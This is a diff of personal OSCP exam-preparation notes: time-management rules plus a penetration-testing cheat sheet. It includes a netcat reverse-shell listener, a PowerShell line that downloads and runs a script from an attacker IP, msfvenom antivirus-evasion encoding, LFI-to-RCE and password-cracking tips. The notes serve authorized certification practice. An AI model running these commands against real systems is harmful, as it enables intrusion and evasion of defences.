@@ -1,390 +1,5 @@
 # OSCP Exam Strategy
 
-## Start AutoRecon on all targets simultaneously
-
-```bash
-autorecon $IP 10.10.10.11 10.10.10.12 10.10.10.13 10.10.10.14
-```
-
-## Start AutoRecon on single target
-
-```bash
-autorecon $IP
-```
-
-## Add target to hosts file
-
-```bash
-echo "$IP target1.htb" | sudo tee -a /etc/hosts
-```
-
-## Verify VPN connection to exam network
-
-```bash
-ip addr show tun0
-ping -c 4 $IP
-```
-
-## Test reachability of all exam targets
-
-```bash
-for ip in $IP 10.10.10.11 10.10.10.12; do ping -c 2 $ip; done
-```
-
-## Quick port scan for initial assessment
-
-```bash
-nmap -T4 --open -p- $IP
-```
-
-## Check running AutoRecon processes
-
-```bash
-ps aux | grep autorecon
-```
-
-## Kill stuck AutoRecon scan
-
-```bash
-pkill -f autorecon
-```
-
-## Start timer for time management
-
-```bash
-date && echo "Started enumeration of $IP"
-```
-
-## Create exam workspace directory structure
-
-```bash
-mkdir -p ~/oscp_exam/{machine1,machine2,machine3,machine4}/{screenshots,scans,exploits,flags}
-```
-
-## Navigate to machine workspace
-
-```bash
-cd ~/oscp_exam/machine1
-```
-
-## Take snapshot before major change
-
-```bash
-echo "Taking snapshot before privilege escalation attempt"
-```
-
-## Document successful exploit command
-
-```bash
-echo "[$(date)] Successfully exploited with: python3 exploit.py $IP" >> notes.txt
-```
-
-## Log failed attempt for review
-
-```bash
-echo "[$(date)] Failed: SQLi on /login.php - no injection point" >> notes.txt
-```
-
-## Set 2-hour timer for moving on
-
-```bash
-echo "Time check: $(date) - 2 hours on this target, time to switch"
-```
-
-## Calculate current exam points
-
-```bash
-echo "Points: User1(10) + Root1(10) + User2(10) + Root2(10) = 40 points"
-```
-
-## Verify minimum passing points achieved
-
-```bash
-echo "Total points: 70+ = PASS"
-```
-
-## Quick enumeration time check
-
-```bash
-echo "[$(date)] Completed enumeration phase - $(expr $(date +%s) - $START_TIME) seconds"
-```
-
-## Monitor long-running scan
-
-```bash
-tail -f scans/nmap_full.txt
-```
-
-## Start focused service enumeration
-
-```bash
-echo "[$(date)] Starting web enumeration on port 80"
-gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
-```
-
-## Document break time
-
-```bash
-echo "[$(date)] Taking mandatory 30-minute break" >> exam_log.txt
-```
-
-## Check elapsed exam time
-
-```bash
-echo "Exam hours elapsed: $(expr $(expr $(date +%s) - $EXAM_START) / 3600)"
-```
-
-## Save working exploit to machine folder
-
-```bash
-cp /tmp/exploit.py ~/oscp_exam/machine1/exploits/
-```
-
-## Backup all notes and screenshots
-
-```bash
-tar -czf ~/oscp_exam_backup_$(date +%Y%m%d_%H%M%S).tar.gz ~/oscp_exam/
-```
-
-## Create quick reference for machine
-
-```bash
-cat > machine_summary.txt << EOF
-Target: $IP
-OS: Windows Server 2019
-User Flag: /Users/john/Desktop/user.txt
-Root Flag: /Users/Administrator/Desktop/proof.txt
-Exploit: MS17-010 EternalBlue
-EOF
-```
-
-## List all captured flags
-
-```bash
-find ~/oscp_exam -name "*.txt" -path "*/flags/*" -exec cat {} \;
-```
-
-## Start screen session for persistence
-
-```bash
-screen -S oscp_exam
-```
-
-## Resume screen session after disconnect
-
-```bash
-screen -r oscp_exam
-```
-
-## Test HTTP server is accessible from target
-
-```bash
-python3 -m http.server 80
-curl http://10.10.14.5
-```
-
-## Verify listener is ready for reverse shell
-
-```bash
-nc -nlvp 4444
-```
-
-## Quick check of common web directories
-
-```bash
-for dir in admin login upload backup; do curl -I http://$IP/$dir; done
-```
-
-## Test for low-hanging fruit vulnerabilities
-
-```bash
-enum4linux -a $IP
-```
-
-## Check for anonymous FTP access
-
-```bash
-ftp $IP
-# Try: anonymous / anonymous
-```
-
-## Test for default credentials on web login
-
-```bash
-# admin:admin, admin:password, root:root, admin:admin123
-```
-
-## Search for quick privilege escalation vectors
-
-```bash
-find / -perm -4000 -type f 2>/dev/null
-```
-
-## Upload and run LinPEAS quickly
-
-```bash
-wget http://10.10.14.5/linpeas.sh
-chmod +x linpeas.sh
-./linpeas.sh | tee linpeas_output.txt
-```
-
-## Upload and run WinPEAS quickly
-
-```powershell
-IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/winPEAS.ps1')
-```
-
-## Check if current user has sudo privileges
-
-```bash
-sudo -l
-```
-
-## Attempt password reuse for privilege escalation
-
-```bash
-su root
-# Try found passwords
-```
-
-## Test for kernel exploit quickly
-
-```bash
-uname -a
-searchsploit linux kernel $(uname -r)
-```
-
-## Set hard stop time for target
-
-```bash
-echo "HARD STOP at $(date -d '+4 hours') - must move to next target"
-```
-
-## Final 2-hour documentation push
-
-```bash
-echo "[$(date)] Entering final documentation phase - no new exploitation"
-```
-
-## Organize screenshots by machine
-
-```bash
-mv screenshot*.png ~/oscp_exam/machine1/screenshots/
-```
-
-## Create final evidence checklist
-
-```bash
-cat > evidence_checklist.txt << EOF
-Machine 1 ($IP):
-- [ ] User flag screenshot
-- [ ] Root flag screenshot
-- [ ] Hostname verification
-- [ ] Whoami proof
-- [ ] System info
-
-Machine 2 (10.10.10.11):
-- [ ] User flag screenshot
-- [ ] Root flag screenshot
-- [ ] Hostname verification
-- [ ] Whoami proof
-- [ ] System info
-EOF
-```
-
-## Verify all required screenshots exist
-
-```bash
-ls -la ~/oscp_exam/*/screenshots/
-```
-
-## Count total screenshots collected
-
-```bash
-find ~/oscp_exam -name "*.png" | wc -l
-```
-
-## Package exam evidence for backup
-
-```bash
-tar -czf oscp_final_evidence_$(date +%Y%m%d).tar.gz ~/oscp_exam/
-```
-
-## Verify proof.txt content captured
-
-```bash
-cat ~/oscp_exam/machine1/flags/proof.txt
-```
-
-## Switch to next target immediately
-
-```bash
-cd ~/oscp_exam/machine2
-autorecon 10.10.10.11
-```
-
-## Review what has been tried on stuck target
-
-```bash
-cat notes.txt | grep "Failed\|Tried"
-```
-
-## Start completely fresh on different target
-
-```bash
-cd ~/oscp_exam/machine3
-echo "[$(date)] Fresh start on new target" > notes.txt
-```
-
-## Calculate time spent on current target
-
-```bash
-echo "Time on target: $(expr $(date +%s) - $TARGET_START_TIME) seconds"
-```
-
-## Mark target for later return
-
-```bash
-echo "RETURN_LATER: Try password spraying with found usernames" >> notes.txt
-```
-
----
-
-## Exam Time Management Philosophy
-
-The OSCP exam is a 24-hour marathon, not a sprint. Success depends more on time management and strategic decision-making than technical skill alone. You must know when to push forward and when to move on.
-
-## Pre-Exam Preparation
-
-Verify your environment is ready the day before. Test VPN connectivity and have backup internet access. Update Kali and verify all tools work. Prepare note-taking system with templates ready. Organize your toolset and scripts. Get adequate sleep. Have food and drinks ready. Set up a comfortable workspace.
-
-## First Hour: Initial Assessment and Triage
-
-Read all machine descriptions carefully and understand point values. Start AutoRecon on all targets simultaneously to maximize time efficiency. While scans run, identify target IPs and add them to /etc/hosts. Take initial screenshot of control panel as proof. Review AutoRecon results as they complete. Identify quick wins like anonymous FTP, default credentials, or obvious vulnerabilities. Start with the easiest-looking target to build confidence and momentum.
-
-## Machine Prioritization Strategy
-
-Focus on achieving 70 points minimum, not 100 points. Easy and medium machines worth 10-20 points should take 3-4 hours each. Hard machines worth 20+ points should take 6-8 hours maximum. Always leave 2-3 hours for final documentation. Multiple user flags are better than chasing one difficult root flag.
-
-## The 2-Hour Rule: Initial Foothold
-
-If you have not gained an initial foothold after 2 hours of focused effort, switch to a different target. Document all attempts thoroughly. Return later with fresh perspective. Tunnel vision is the enemy of time management. The exam provides multiple paths to 70 points.
-
-## The 4-Hour Rule: User Access
-
-If you have not achieved user-level access after 4 hours, seriously consider moving to a different target. Document all findings and attempted exploits. Set a specific time to return if needed. User flags from multiple machines are more valuable than spending excessive time on one difficult target.
-
-## The 6-Hour Rule: Admin/Root Access
-
-If you have not achieved administrator or root access after 6 hours total on one machine, move to the next target immediately. The user flag may be sufficient for passing when combined with other machines. Better to have multiple user flags than spending entire exam on one root flag.
-
-## Enumeration Time Limits
-
-Initial AutoRecon should complete within 15-30 minutes. Web application enumeration should take 45-60 minutes maximum. SMB and Active Directory enumeration should take 30-45 minutes maximum. Database services should take 20-30 minutes maximum. Stop enumerating when you have identified a viable attack vector, found credentials or sensitive information, discovered a known vulnerability with available exploit, or exhausted common attack vectors for that service.
-
-## Break Management is Critical
-
-Take 10 minutes every 2 hours minimum. Take 30 minutes every 4 hours for meals and mental reset. Take a mandatory 1-hour break at the 12-hour mark. Always take eyes completely off the screen during breaks. Physical movement, hydration, and mental reset prevent burnout and tunnel vision.
 
 ## Warning Signs You Need a Break
 
@@ -402,50 +17,108 @@ Switch to a different machine temporarily. Review your methodology checklist for
 
 Take a mandatory 15-30 minute break away from computer. Start completely fresh on a different target. Document everything you have tried in detail. Plan return strategy with specific new approaches to try. This prevents wasting time repeating failed methods.
 
-## Common Time Wasters to Avoid
+---
 
-Complex SQL injection without clear path forward. Buffer overflow attempts which are not on the current exam. Kernel exploits as first approach instead of proper enumeration. Brute forcing without considering rate limiting or account lockout. Waiting for slow automated scans instead of targeted manual testing. Running multiple tools for the same task. Perfectionism in exploitation or documentation during the exam.
+# Article Notes
+Miscellaneous practical tips for the exam, from various blogs.
 
-## Point Optimization Strategy
+##  OSCP Exam Secrets — Avoiding Rabbit Holes and Staying on Track (Part 2)
 
-Understand minimum viable scenarios. Scenario 1: 70 points from 2 full machines (40 points) plus 1 user flag (10 points) plus 1 admin flag elsewhere (20 points). Scenario 2: 70 points from 3 full machines (60 points) plus 1 user flag (10 points). Calculate whether pursuing difficult admin flag is worth time investment. Multiple easier targets often better than one hard target.
+https://infosecwriteups.com/oscp-exam-secrets-avoiding-rabbit-holes-and-staying-on-track-part-2-c5192aee6ae7
 
-## Documentation During Exam
+- LFI is good for information disclosure, but also a good vector to RCE via log poisoning or PHP stream wrappers
+- Checklist for after finding a private key, id_rsa
+	- `ssh -i id_rsa user@TARGET -p PORT -o IdentitiesOnly=yes -o BatchMode=yes -vvv`
+	- Check password protection: `ssh-keygen -y -f id_rsa >/dev/null && echo “no passphrase” || echo “passphrase-protected or invalid”`
+	- If password protected, use ssh2john and crack
+	- If ssh complains about libcrypto or key format, normalize the file: `dos2unix id_rsa` then `vim --clean id_rsa`
+- Use RunasCs to switch users on Windows without having access to a GUI https://github.com/antonioCoco/RunasCs
+- 
+## Beyond the Shell: Advanced Enumeration and Privilege Escalation for OSCP (Part 3)
 
-Screenshot everything important immediately. Copy working commands into templates. Note failed attempts with reasoning for later reference. Timestamp major discoveries. Focus on basic notes during exam, detailed write-up comes after. Screenshots are more important than detailed notes during exploitation phase.
+https://infosecwriteups.com/beyond-the-shell-advanced-enumeration-and-privilege-escalation-for-oscp-part-3-7410d3812d02
 
-## Final Hours Strategy
+- When using a PHP reverse shell with a Windows target, use the PHP Ivan Sincek shell from revshells.com
+	- reliable and often gives access as a Service User, which will usually have SeImpersonatePrivilege
+- For Windows automated privesc, start with PrivescCheck.ps1 (clean and accurate results) https://github.com/itm4n/PrivescCheck
+	- `powershell -ep bypass -c “. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML”`
+- Just use john with rockyou for cracking, don't worry about hashcat or other lists
+	- If there's an "About Us" page on a target website, use username anarchy / cupp / cewl to generate a custom wordlist
+		- `cewl http://testphp.vulnweb.com -w test.txt`
+		- `cewl http://testphp.vulnweb.com/artists.php --with-numbers`
+	- `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
+	- Password protected zips and kbdx files are likely meant to be cracked. Use zip2john or kbdx2john 
+- Clock Skew
+	- "KRB_AP_ERR_SKEW(Clock skew too great)." when using attacks involving Kerberos
+	- Use `ntpdate` or `rdate` on kali system to sync local time to the DC
+- AV evasion
+	- encode msfvenom payloads with x86/shikata_ga_nai or x64/xor_dynamic with multiple iterations (-i) to change the signature
+- FTP/SMB
+	- When there is FTP or SMB, check for anon/default creds immediately
+	- Try to enumerate/discover usernames. Then use the discovered names to brute force web pages or SSH
+	- Try strange file/dir names as usernames/passwords across other systems
+- Don't hesitate to revert a machine if something doesn't work
+- File transfer basics
+	- Linux: 
+		- Serve: `python3 -m http.server 80`
+		- Download: `curl http://<Kali-IP>/file.bin -o file.bin`
+	- Windows: 
+		- Serve: `impacket-smbserver`
+		- Upload/download from Windows: use `copy`
 
-With 2 hours remaining, enter triage mode. Stop starting new major attacks. Focus only on low-hanging fruit and quick privilege escalation attempts. Verify point calculations add up to 70 or more.
+# Tooling To Help Hunt Down POCs For Vulnerable CVEs Beyond Searchsploit
+## searchsploit
+`searchsploit -u`
 
-With 1 hour remaining, enter documentation mode. Stop all exploitation attempts completely. Organize all screenshots properly. Verify all proof.txt contents are captured. Double-check point calculations match evidence.
+...
 
-With 30 minutes remaining, perform final checks. Screenshot final proof if not already done. Backup all documentation to multiple locations. Submit exam attempt through proper channel. Begin mental preparation for report writing phase.
+## Vulnx
 
-## Contingency Planning
+`go install github.com/projectdiscovery/cvemap/cmd/vulnx@latest`
 
-If behind schedule, lower standards to user flags instead of chasing admin flags. Switch targets more aggressively. Use simpler exploitation methods even if less elegant. Focus on known vulnerabilities instead of research.
+Add to PATH if not present
+in bashrc, zsh etc
+`export PATH=/home/username/go/bin/:$PATH`
 
-If ahead of schedule, do not get overconfident and make mistakes. Double-check all documentation is complete. Attempt bonus objectives carefully without risking completed work. Ensure already-obtained flags are properly documented.
+Create account on
+ https://cloud.projectdiscovery.io
 
-## Mental Game and Stress Management
+Auth with API key
+`vulnx auth`
 
-Build confidence by starting with easiest target first. Celebrate every small win because every flag counts toward 70 points. Remember your training and that you have successfully done this before. Trust your methodology because it works.
+```
+vulnx version
+vulnx healthcheck
+```
 
-Deal with frustration by remembering it is normal and everyone experiences it. Take breaks when frustrated. Switch targets for fresh perspective. Focus on process and methodology, not outcome.
+`vulnx search "form tools 3.1.1"`
 
-Stay motivated by tracking progress visually with points earned. Remember your goal is 70 points, not perfection. Think long-term because this is just one attempt, retakes are allowed. Stay hydrated and fed throughout the exam.
+`--detailed`
 
-## Post-Exam Priorities
+`vulnx id <CVE>`
 
-Within 1 hour, screenshot final control panel, backup all documentation, take a well-earned break, and plan report writing schedule.
+## Search_Vulns
 
-Within 24 hours, start report writing within 12 hours while memory is fresh. Use screenshots as primary evidence. Follow OffSec template exactly. Proofread everything before final submission.
+```
+git clone https://github.com/ra1nb0rn/search_vulns
+cd ./search_vulns
+docker build -t "new-docker-name" .
+docker build -t search_vulns .
 
-## The Golden Rules
+docker run -it "docker-name" bash
+docker run -it search_vulns bash
+```
 
-Time management beats perfect technique. 70 points is the goal, not 100 points. Working solution beats elegant solution every time. Multiple attempts are allowed if needed. Learn from each attempt to improve.
+search_vulns.py print help and update
 
-## Final Words
+```
+python3 ./search_vulns.py -h
+./search_vulns.py -h
 
-Trust your preparation because you have trained for this. Stay calm because panic leads to poor decisions. Be methodical and let templates guide you. Do not give up because many flags come in the final hours. Thousands have passed before you. You can do this.
+./search_vulns.py -u
+./search_vulns.py --full-update
+```
+
+ query search_vulns
+
+`./search_vulns.py -q "CVE-2024-22722"`
